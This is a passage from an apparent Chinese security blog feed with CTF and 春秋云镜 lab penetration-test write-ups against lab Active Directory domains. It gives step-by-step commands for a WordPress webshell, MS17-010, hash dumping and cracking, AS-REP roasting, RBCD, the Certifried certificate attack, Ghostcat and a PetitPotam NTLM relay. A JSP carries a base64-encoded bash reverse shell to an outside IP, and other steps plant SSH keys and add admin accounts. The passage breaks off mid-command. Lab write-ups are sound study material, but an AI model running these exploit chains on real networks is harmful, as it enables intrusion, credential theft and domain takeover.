chr%2834%29%2Bchr%2844%29%2Bchr%2834%29%2Bchr%28119%29%2Bchr%2834%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2850%29%2Bchr%2846%29%2Bchr%28119%29%2Bchr%28114%29%2Bchr%28105%29%2Bchr%28116%29%2Bchr%28101%29%2Bchr%2840%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2849%29%2Bchr%2846%29%2Bchr%28114%29%2Bchr%28101%29%2Bchr%2897%29%2Bchr%28100%29%2Bchr%2840%29%2Bchr%2841%29%2Bchr%2841%29%2Bchr%2859%29%29%60%60%3A%60</span><br><span class="line">http://124.70.33.170:24001/114.html</span><br><span class="line"></span><br><span class="line">//这里是用chr来绕过</span><br><span class="line">ACTF&#123;Th3_only_1_I_c4n_tRUST_is_mySeLf&#125;</span><br></pre></td></tr></table></figure><p><a href="https://ml-hacker.github.io/2023/10/31/ACTF/">https://ml-hacker.github.io/2023/10/31/ACTF/</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://su-team.cn/passages/2023-10-28-ACTF/&quot;&gt;https://su-team.cn/passages/2023-10-28-ACTF/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wm-ctf-te</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-网鼎半决赛</title>
    <link href="https://ke1nys.github.io/posts/7fa7855c.html"/>
    <id>https://ke1nys.github.io/posts/7fa7855c.html</id>
    <published>2023-10-27T01:31:14.000Z</published>
    <updated>2023-11-07T14:23:59.805Z</updated>
    
    <content type="html"><![CDATA[<p>先fscan扫一下</p><p><img src="../images/image-20231027094654730.png" alt="image-20231027094654730"></p><p>就开了个80端口</p><p><img src="../images/image-20231027094735843.png" alt="image-20231027094735843"></p><p>是wp框架  直接wpscan开扫</p><p><img src="../images/image-20231027095031239.png" alt="image-20231027095031239"></p><p>并没有发现什么有用的东西   直接去访问后台 <code>/wp-admin</code></p><p>存在弱口令登录  <code>admin/123456</code></p><p><img src="../images/image-20231027095305128.png" alt="image-20231027095305128"></p><p>然后在后台处写马  然后访问路径并连接蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027095514155.png" alt="image-20231027095514155"></p><p>这里不需要提权  www-data权限就能够访问flag了</p><p>这里的话有个点就是这个靶机不开3306端口(或者其他替代3306端口的端口)  导致看到config.php的数据库配置内容  也不能连接数据库</p><p><img src="../images/image-20231027095730384.png" alt="image-20231027095730384"></p><p>接下来就是扫内网挂代理了</p><p>先弹个shell到vps上  不想在蚁剑终端进行操作</p><p><img src="../images/image-20231027100032377.png" alt="image-20231027100032377"></p><p><img src="../images/image-20231027100119190.png" alt="image-20231027100119190"></p><p>信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">172.22.15.26   getshell主机</span><br><span class="line"></span><br><span class="line">172.22.15.13   XR-DC01   XR-DC01.xiaorang.lab</span><br><span class="line"></span><br><span class="line">172.22.15.18   XR-CA XR-CA.xiaorang.lab   (poc-yaml-active-directory-certsrv-detect)</span><br><span class="line"></span><br><span class="line">172.22.15.24  3306  XR-WIN08   MS17-010</span><br><span class="line"></span><br><span class="line">172.22.15.35   XR-0687  XIAORANG\XR-0687</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>域内一共五台机器  </p><p>直接去打ms17就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.15.24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>这里需要打两次   第一次打会超时   我们得打第二次</p><p><img src="../images/image-20231027100652974.png" alt="image-20231027100652974"></p><p>hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>psexec连上去(因为这里的meterpreter不能进入shell………………….)  也可以直接读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 psexec.py -hashes :0e52d03e9b939997401466a0ec5a9cbc xiaorang.lab/administrator@172.22.15.24 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027101013547.png" alt="image-20231027101013547"></p><p>然后rdp上去  看看有什么东西</p><p>直接新建有个用户上去的话会报错   (修复方法 <a href="https://blog.csdn.net/juanjuan_01/article/details/127005255">方法一</a>   <a href="https://blog.csdn.net/weixin_40276431/article/details/111034925?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-111034925-blog-127005255.235^v38^pc_relevant_default_base3&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">方法二</a> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br><span class="line"></span><br><span class="line">//或者直接修改administrator的密码也行</span><br><span class="line">net user administrator qwer1234!</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027101337213.png" alt="image-20231027101337213"></p><p>看到有个小皮  并且之前扫出来他有个页面</p><p><img src="../images/image-20231027101415212.png" alt="image-20231027101415212"></p><p>去翻之前的信息的话还发现其开了3306端口  然后去查看www下的源码 </p><p><img src="../images/image-20231027101517544.png" alt="image-20231027101517544"></p><p>发现其还有个数据库管理后台  直接小皮看密码  然后登录</p><p><img src="../images/image-20231027101557478.png" alt="image-20231027101557478"></p><p><img src="../images/image-20231027101654403.png" alt="image-20231027101654403"></p><p>发现用户  直接以csv格式导出  然后execl打开并把用户名那一列单独拿出来跑 <strong>AS-REP Roasting</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile user.txt -request</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027101921486.png" alt="image-20231027101921486"></p><p>爆出两个session_key 直接hashcat破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$lixiuying@XIAORANG.LAB:013bd18856b9a83c5c5d8744b23468a4$6060145fa7ee7522bf8b8cd88215f2375ffaed5e78a5ed25764856be6e69ebc4c43c441d3d81df811cb4d8b9f5369e98f33904c5e40b133b6afb63742624cdd14f3d83bb1026c850b2d57364f4fe4b564ddfa2cf8d9db1cd5a613101d6855c090fb785ee900e661833636e558d37e88aebb6153b45a8d5abc05fb12af52fc44fbed031bccd9740e42c021469f4bfddc8194de2e36450baf9848f5799f8b4f487705c50c2def3a20b4515aab06884711d94e126d8fc666d3256dbe7f74651d6f077d5095913364f38903324d1a33bcc343f0b0bb10c06a3cee9c196ff0419aef1e149e4c4dea501ad34b20154</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5asrep$23$huachunmei@XIAORANG.LAB:b3479f9803b3fc703d83ceb0fc43520e$7fc9597624a5e59b566fe9b7244bbb5b79ba2ed8e647a4a576881ba493c578c2eb8b6a72224a84e63cb376af69eb2b9bb6533e095c6f8e716601a32fc361c6bc2b3457b0d6c63b16a6567394ab2655aa8485eb9dc0d3da4d2e0b1885e69f2bccfa48c59c8b5f3104a08bf139b81186e47f994f722a389aa27e0a563c6b33cf7eaaa57faa8b026864ebbfbcba183aee423f1ef2632d59848496503035fe9c19cb03a19e4d512e348d7565690f73b0d22e789081dc7404c6e7d49913a2409496e3aa57b56c7f57d3b988960650807cb06cd45023a37991e8a897b40f1d3c1178d0fd0a0794d562e42738c60121</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027102232491.png" alt="image-20231027102232491"></p><p>另一个同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lixiuying:winniethepooh</span><br><span class="line">huachunmei:1qaz2wsx</span><br></pre></td></tr></table></figure><p>用crackmapexec跑一下  看看情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.15.0/24 -u lixiuying -p winniethepooh -d xiaorang.lab</span><br><span class="line">(13 18 35)</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.15.0/24 -u huachunmei -p 1qaz2wsx -d xiaorang.lab</span><br><span class="line">(13 18 35)</span><br><span class="line"></span><br><span class="line">域控和CA不太可能   直接去rdp试试35</span><br></pre></td></tr></table></figure><p>这里不直接跑rdp的原因时太乱了 根本跑不出来  直接就smb也差不多</p><p><img src="../images/image-20231027102620548.png" alt="image-20231027102620548"></p><p>能rdp成功  直接跑一下sharphound</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp</span><br></pre></td></tr></table></figure><p>然后分析域内环境  (主要时对我们刚刚获取到的两个用户进行分析  看看有没有什么特俗的权限)</p><p><img src="../images/image-20231027102829106.png" alt="image-20231027102829106"></p><p>这里时发现了lixiuying这个用户对XR-0687这台机器具有<code>genericwrite</code>权限   直接RBCD开打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/lixiuying:&#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/lixiuying:&#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -action write -delegate-to &#x27;XR-0687$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">vi /etc/hosts</span><br><span class="line"></span><br><span class="line">proxychains psexec.py administrator@XR-0687.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027103231807.png" alt="image-20231027103231807"></p><p>拿下第三个flag</p><p>这里的话就剩最后有个CA靶机和域控了 </p><p><img src="../images/image-20231027103352765.png" alt="image-20231027103352765"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.15.18  XR-CA.xiaorang.lab   (poc-yaml-active-directory-certsrv-detect) </span><br><span class="line"></span><br><span class="line">//并且在这个fscan扫描的时候还爆出了漏洞</span><br></pre></td></tr></table></figure><p>用certify扫一下  看看有没有模板漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad find -u &#x27;lixiuying@xiaorang.lab&#x27; -p &#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027103622596.png" alt="image-20231027103622596"></p><p>找到ESC8这个漏洞  但是这个漏洞的话打起来有点麻烦  我们就想去尝试去看看CVE-2022–26923这个洞能不能打</p><p><a href="https://forum.butian.net/share/1578">https://forum.butian.net/share/1578</a>    这篇文章很详细的分析了这个漏洞</p><p><img src="../images/image-20231027103810413.png" alt="image-20231027103810413"></p><p>能创建成功  说明存在这个漏洞  然后接着往下打就行</p><p>申请证书模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad req -u &#x27;TEST2$@xiaorang.lab&#x27; -p &#x27;P@ssw0rd&#x27; -ca &#x27;xiaorang-XR-CA-CA&#x27; -target 172.22.15.18 -template &#x27;Machine&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027104013791.png" alt="image-20231027104013791"></p><p><strong>(这里申请的证书能打域控的原因就是这里修改了dns-host-name为域控)</strong></p><p><strong>这也是造成这个CVE的原因</strong></p><p>申请TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027104101937.png" alt="image-20231027104101937"></p><p>报错了  这个报错和我之前打<code>shadow credentials</code>的时候报错是一模一样的</p><p><a href="https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/">https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/</a>   这位师傅解决了这个问题</p><p>大致就是 AD 默认支持两种协议的证书身份验证: Kerberos PKINIT 协议和 Schannel</p><p>这里的话报错是<strong>因为域控制器没有安装用于智能卡身份验证的证书</strong>（例如，使用 “域控制器” 或 “域控制器身份验证” 模板）、用户密码已过期或提供了错误的密码时，可能会出现此问题。</p><p>所以可以尝试 Schannel</p><p>即通过 Schannel 将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD / DCSync), 进而获得域控权限</p><p><strong>工具地址  <a href="https://github.com/AlmondOffSec/PassTheCert">https://github.com/AlmondOffSec/PassTheCert</a></strong></p><p>先用whoami测试是否可行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在测试之前  记得先将xr-dc01.pfx  转为user.crt  和   user.key</span><br><span class="line">certipy-ad cert -pfx xr-dc01.pfx -nokey -out user.crt</span><br><span class="line">certipy-ad cert -pfx xr-dc01.pfx -nocert -out user.key</span><br><span class="line"></span><br><span class="line">然后进行whoami测试</span><br><span class="line"></span><br><span class="line">proxychains python3 passthecert.py -action whoami -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027104831029.png" alt="image-20231027104831029"></p><p>接下直接打域控的rbcd就完事了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to &#x27;XR-DC01$&#x27; -delegate-from &#x27;TEST2$&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027105049002.png" alt="image-20231027105049002"></p><p>申请TGS’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST2$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p>无密码连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@XR-DC01.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027105245189.png" alt="image-20231027105245189"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231027094654730.png&quot; alt=&quot;image-20231027094654730&quot;&gt;&lt;/p&gt;
&lt;p&gt;就开了个80端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Spoofing</title>
    <link href="https://ke1nys.github.io/posts/ac5e4dda.html"/>
    <id>https://ke1nys.github.io/posts/ac5e4dda.html</id>
    <published>2023-10-25T11:08:02.000Z</published>
    <updated>2023-10-25T14:13:34.198Z</updated>
    
    <content type="html"><![CDATA[<p>先用fscan扫一下</p><p><img src="../images/image-20231025193232597.png" alt="image-20231025193232597"></p><p>就只扫到一个8080  8009端口和一个后台管理系统 </p><p><img src="../images/image-20231025193313805.png" alt="image-20231025193313805"></p><p>其实搜一下就会发现这是个tomcat   访问8080端口的  发现是个纯静态网页  没啥用  直接开扫目录</p><p><img src="../images/image-20231025193500422.png" alt="image-20231025193500422"></p><p><img src="../images/image-20231025193843475.png" alt="image-20231025193843475"></p><p>访问docs目录</p><p><img src="../images/image-20231025193919376.png" alt="image-20231025193919376"></p><p>有洞  直接去找poc来打</p><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.99.248.175:8080/ 8009  /WEB-INF/web.xml read</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025194055367.png" alt="image-20231025194055367"></p><p>发现有个UploadServlet路由  访问并且上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传文件</p><p><img src="../images/image-20231025194249510.png" alt="image-20231025194249510"></p><p>这个上传路径就是关键了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/95e3563074ba300f4e3f6a806d775b2c/20231025074306680.txt</span><br></pre></td></tr></table></figure><p>然后用上面的工具直接来打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.99.248.175:8080/ 8009 /upload/95e3563074ba300f4e3f6a806d775b2c/20231025074306680.txt   eval</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025194459228.png" alt="image-20231025194459228"></p><p>root权限直接拿flag就行了</p><p><img src="../images/image-20231025194609005.png" alt="image-20231025194609005"></p><p>然后收集信息  挂代理扫内网了</p><p><img src="../images/image-20231025194647224.png" alt="image-20231025194647224"></p><p><img src="../images/image-20231025195054731.png" alt="image-20231025195054731"></p><p>信息收集一下  然后整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.11.76  getshell机器</span><br><span class="line"></span><br><span class="line">172.22.11.6  域控机器 DC  DC XIAORANG\XIAORANG-DC</span><br><span class="line"> </span><br><span class="line">172.22.11.26  XIAORANG\XR-LCM3AE8B</span><br><span class="line"></span><br><span class="line">172.22.11.45   MS17-010   XR-DESKTOP.xiaorang.lab  </span><br></pre></td></tr></table></figure><p>有个MS17  直接打就行了   (这里建议用本地msf打  不然会报错  原因是啥我也不知道)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025195542199.png" alt="image-20231025195542199"></p><p><img src="../images/image-20231025200113679.png" alt="image-20231025200113679"></p><p>然后直接导出本地hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XR-DESKTOP$  XIAORANG  0e1f6735dcf951891dbf20a4f0097423  4001c14de86e59f69085d140df5fada9ed2c19ca</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yangmei      xrihGHgoNZQ  //获取到了有个明文和hash密码</span><br></pre></td></tr></table></figure><p>yangmei这个用户可以rdp到ms17这个主机上   跑个sharphound没发现啥有用的信息  于是回到这个题目本身  发现给了个提示 WebClient</p><p><img src="../images/image-20231025201301198.png" alt="image-20231025201301198"></p><p><strong>(这就是为啥不直接打rbcd的原因  不能创建机器账户是其一  并且也不知道yangmei用户是否有写属性的)</strong></p><p>扫描WebClient</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav</span><br></pre></td></tr></table></figure><p>只有26的这台机器存在<code>Webclient</code>服务</p><p><img src="../images/image-20231025202543946.png" alt="image-20231025202543946"></p><p><strong><img src="../images/image-20231025201701199.png" alt="image-20231025201701199"></strong></p><p><strong>默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证</strong></p><p>扫描一下Petitpotam  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025201745549.png" alt="image-20231025201745549"></p><p>在奇安信的一篇文章中  总结了所有域强制认证的所有方法</p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a></p><p>这下子是三台机器存在Petitpotam这个服务了</p><p>以下是参考<a href="https://www.cnblogs.com/backlion/p/17187375.html">https://www.cnblogs.com/backlion/p/17187375.html</a>  这篇文章来进行编写的</p><p>这两个组合起来就会让人联想到一个攻击手法</p><p><strong>无ADCS + Petitpotam + ntlm中继打法</strong></p><p>攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD)</p><ul><li><p>条件 — 目标机器需要开启webclient服务</p></li><li><p>中继攻击手法</p></li></ul><blockquote><ul><li>实战中的中继打法只需要停掉80占用服务，开启端口转发（portfwd，CS在后续版本中添加了rportfwd_local，直接转发到客户端本地）</li><li>本次演示类似实战的打法，不选择把impacket丢到入口ubuntu上面这种操作</li></ul></blockquote><ol><li>中继攻击环境配置: 端口转发 + 代理<br>我们目前需要把服务器的80，转发到客户端本地的80</li></ol><p>直接上命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.248.175  -D 101.42.39.110:7777 -R \*:79:127.0.0.1:80</span><br><span class="line"></span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure><p>记得写公钥到getshell主机上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#自己的机器上</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#弹的shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pub的内容&quot; &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.248.175</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025203310301.png" alt="image-20231025203310301"></p><p><img src="../images/image-20231025203418194.png" alt="image-20231025203418194"></p><p><img src="../images/image-20231025203405384.png" alt="image-20231025203405384"></p><p>说明了成功将端口转发到本地了  我们直接使用本地来替代172.22.11.76这台机器</p><p>接着本地开启开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p><p><strong>(用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD))</strong></p><p>上面加黑的就是原理了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line">proxychains python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025204332096.png" alt="image-20231025204332096"></p><p><img src="../images/image-20231025204500404.png" alt="image-20231025204500404"></p><p><img src="../images/image-20231025204511857.png" alt="image-20231025204511857"></p><p><strong>成功使用PetitPotam这个方法   强制使26这台带有webclient的机器去访问 我们的中继服务(并且获取到的权限还将26这台机器的msDS-AllowedToActOnBehalfOfOtherIdentity 属性修改成45这台机器上  这样就变成了RBCD攻击)</strong></p><p>接下来申请ST直接去访问26这台机器就行了  <strong>(这里的hash值是之前在打上面45这台机器的时候导出的)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :0e1f6735dcf951891dbf20a4f0097423  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span 